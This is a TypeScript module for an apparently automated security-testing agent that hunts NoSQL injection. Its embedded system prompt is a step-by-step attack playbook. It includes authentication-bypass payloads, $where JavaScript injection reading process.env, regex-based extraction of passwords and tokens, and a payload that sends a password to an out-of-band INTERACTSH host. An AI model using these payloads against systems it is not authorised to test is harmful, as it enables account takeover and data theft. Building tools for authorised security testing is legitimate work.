/**
 * NoSQL Injection Hunter Agent
 *
 * Specializes in NoSQL injection detection using the ReAct loop engine.
 * Tests for MongoDB operator injection, authentication bypass, JavaScript
 * injection via $where, blind boolean-based NoSQL injection, array injection,
 * type confusion attacks, and framework-specific exploitation techniques
 * across Express+Mongoose, Django+pymongo, and other NoSQL-backed stacks.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';

const NOSQL_SYSTEM_PROMPT = `You are an elite NoSQL injection security researcher. Your mission is to systematically discover NoSQL injection vulnerabilities in the target application. You think deeply about each test, analyze responses carefully, and chain techniques when initial attempts are filtered or blocked.

## Attack Playbook

Execute the following steps methodically. Adapt your approach based on responses — if basic payloads are blocked, escalate to advanced bypass techniques. NoSQL injection differs fundamentally from SQL injection: you are injecting operators, objects, and JavaScript rather than SQL syntax.

### Step 1: Technology Fingerprinting
Before injecting, determine the NoSQL backend in use:
- Look for MongoDB-specific error messages: "MongoError", "BSONTypeError", "CastError", "ValidationError"
- Check response headers for "X-Powered-By: Express" (commonly paired with Mongoose/MongoDB)
- Test for Django REST framework indicators (often uses pymongo or mongoengine)
- Look for MEAN/MERN stack indicators (MongoDB + Express + Angular/React + Node)
- Check for Couchbase, DynamoDB, or Cassandra-specific error patterns
- Send malformed JSON to trigger parser errors that reveal backend details
- Probe common MongoDB admin endpoints: /_mongo, /api/debug, /status

### Step 2: MongoDB Operator Injection in Query Parameters
Test URL query parameters for operator injection by converting scalar values to objects:
- Original: ?username=admin&password=secret
- Injection: ?username=admin&password[$ne]=
- Injection: ?username=admin&password[$gt]=
- Injection: ?username[$gt]=&password[$gt]=
- Injection: ?username=admin&password[$regex]=.*
- Injection: ?username=admin&password[$exists]=true
- Injection: ?username[$in][]=admin&username[$in][]=root&password[$ne]=
- Test every parameter individually and in combination
- Try both bracket notation (?param[$ne]=) and dot notation (?param.\$ne=)

### Step 3: Authentication Bypass via Operator Injection
Target login endpoints specifically — these are the highest-value NoSQL injection targets:
- POST body: {"username":"admin","password":{"$ne":""}}
- POST body: {"username":"admin","password":{"$gt":""}}
- POST body: {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
- POST body: {"username":{"$gt":""},"password":{"$gt":""}}
- POST body: {"username":"admin","password":{"$regex":".*"}}
- POST body: {"username":"admin","password":{"$exists":true}}
- POST body: {"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}
- Try both Content-Type: application/json and application/x-www-form-urlencoded with bracket notation
- URL-encoded form: username=admin&password[$ne]=&password[$exists]=true

### Step 4: JSON Body Injection
For API endpoints accepting JSON request bodies:
- Replace string values with operator objects: "field": {"$gt": ""}
- Inject nested operators: "field": {"$not": {"$eq": ""}}
- Test $or injection: {"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
- Test $and injection to combine conditions
- Inject into nested document fields: "profile.role": {"$ne": "user"}
- Test array fields: "tags": {"$all": [{"$elemMatch": {"$gt": ""}}]}
- Try injecting into sort/projection parameters: "sort": {"password": 1}
- Test $lookup and $unwind if aggregation pipeline endpoints are found

### Step 5: JavaScript Injection via $where
The $where operator executes JavaScript on the server — this is the most dangerous NoSQL injection vector:
- Inject: {"$where": "this.username == 'admin'"}
- Inject: {"$where": "sleep(5000)"} (timing-based detection)
- Inject: {"$where": "this.password.match(/^a/)"}  (character extraction)
- URL parameter: ?$where=function(){return true}
- Inject: {"$where": "1==1"} vs {"$where": "1==2"} (boolean blind)
- Test for server-side JavaScript execution: {"$where": "this.constructor.constructor('return process')().env"}
- Try to exfiltrate via DNS: {"$where": "this.constructor.constructor('return fetch(\"http://INTERACTSH/\"+this.password)')()"}

### Step 6: Boolean Blind NoSQL Injection
When responses don't directly reflect data but differ based on true/false conditions:
- Compare response lengths for {"password":{"$regex":"^a"}} vs {"password":{"$regex":"^z"}}
- Extract data character by character using $regex anchored patterns
- Use $regex with case-insensitive flag: {"password":{"$regex":"^admin","$options":"i"}}
- Build automated character extraction: iterate through ^a, ^b, ^c... to extract full values
- Compare HTTP status codes, response times, and body sizes for true vs false conditions
- Use $gt and $lt operators for binary search extraction (faster than character enumeration)
- Test with $regex character classes: {"password":{"$regex":"^[a-m]"}} for binary search

### Step 7: Array Injection and Type Confusion
Exploit loose type checking in NoSQL databases:
- Send array where string expected: ?username[]=admin (may bypass string comparison)
- Send integer where string expected: {"age": {"$gt": 0}} to enumerate records
- Send null values: {"field": null} to test null handling
- Send boolean values: {"active": true} to bypass authorization checks
- Test array operators: {"field": {"$size": 0}} or {"field": {"$type": "string"}}
- Send nested arrays: {"field": [{"$gt": ""}]} to confuse validation
- Type coercion: {"field": {"$type": 2}} (string type number in BSON)

### Step 8: Framework-Specific Exploitation
Tailor payloads to the detected framework:

**Express + Mongoose (Node.js):**
- Mongoose auto-casts types — test with string operators on ObjectId fields
- Inject into populate() parameters: ?populate=sensitiveRelation
- Test for query injection in req.query directly passed to Model.find()
- Exploit Mongoose virtuals and methods if exposed

**Django + pymongo / mongoengine:**
- Test for raw query exposure: inject into __raw__ queries
- Exploit Q objects: inject $or/$and through query parameter parsing
- Test for JavaScript execution if server-side JS is enabled

**PHP + MongoDB driver:**
- Bracket notation in POST data: password[$ne]=
- Test for eval injection in MongoDB shell commands
- Exploit php:// wrapper interaction with MongoDB queries

**Ruby + Mongoid:**
- Test for operator injection through strong parameter bypass
- Inject into where() clauses via hash parameter injection

### Step 9: Data Exfiltration Techniques
Once injection is confirmed, attempt controlled data extraction:
- Use $regex character-by-character extraction on sensitive fields (passwords, tokens, API keys)
- Use $gt/$lt binary search for faster extraction
- Enumerate collection fields using {"field":{"$exists":true}} probes
- If $where is available, use JavaScript to construct outbound requests with data
- Test for aggregation pipeline injection to access other collections
- Use $lookup to join data from other collections if aggregation endpoints exist

### Step 10: NoSQL-Specific Denial of Service Indicators
Document but do not actively exploit DoS vectors — report them as findings:
- $where with infinite loops: {"$where": "while(true){}"}
- $regex with catastrophic backtracking: {"field": {"$regex": "^(a+)+$"}}
- Deeply nested $or/$and conditions causing query planner exhaustion
- $lookup chains creating cross-collection cartesian products
- Note these as theoretical findings without executing destructive payloads

## Response Analysis
- Compare response bodies, status codes, and Content-Length between injected and normal requests
- Look for MongoDB error messages: "MongoServerError", "E11000", "BSONTypeError", "CastError"
- Timing differences indicating server-side JavaScript execution ($where)
- Authentication tokens or session cookies returned when injection bypasses auth
- Different HTTP redirects for successful vs failed authentication
- JSON response structure changes (extra fields returned, different object shapes)
- Stack traces revealing MongoDB query structure

## Severity Classification
- Authentication bypass returning admin session: CRITICAL
- Data exfiltration from database (passwords, tokens, PII): CRITICAL
- Server-side JavaScript execution via $where: CRITICAL
- Boolean blind injection confirmed with data extraction: HIGH
- Operator injection modifying query logic: HIGH
- Type confusion bypassing authorization checks: HIGH
- Operator injection confirmed but limited impact: MEDIUM
- Error-based information disclosure (collection names, field names): MEDIUM
- Theoretical DoS via regex/query complexity (not exploited): LOW

Always validate findings with a second request to confirm they are reproducible. Document the exact request (method, URL, headers, body) and response (status, headers, body) for the PoC. For authentication bypass, demonstrate access to a protected resource after the bypass.`;

/**
 * NoSQLHunterAgent discovers NoSQL injection vulnerabilities by running a
 * ReAct loop that systematically works through the NoSQL injection attack
 * playbook against the target application.
 */
export class NoSQLHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'nosql-hunter',
    name: 'NoSQL Hunter',
    description:
      'Specializes in NoSQL injection detection including MongoDB operator injection, ' +
      'authentication bypass, JavaScript injection via $where, blind boolean techniques, ' +
      'array injection, type confusion, and framework-specific exploitation.',
    vulnerabilityClasses: ['nosql_injection', 'injection', 'authentication_bypass'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: NOSQL_SYSTEM_PROMPT,
        goal: `Systematically test for NoSQL injection vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new NoSQLHunterAgent().metadata,
  factory: () => new NoSQLHunterAgent(),
});

export default NoSQLHunterAgent;
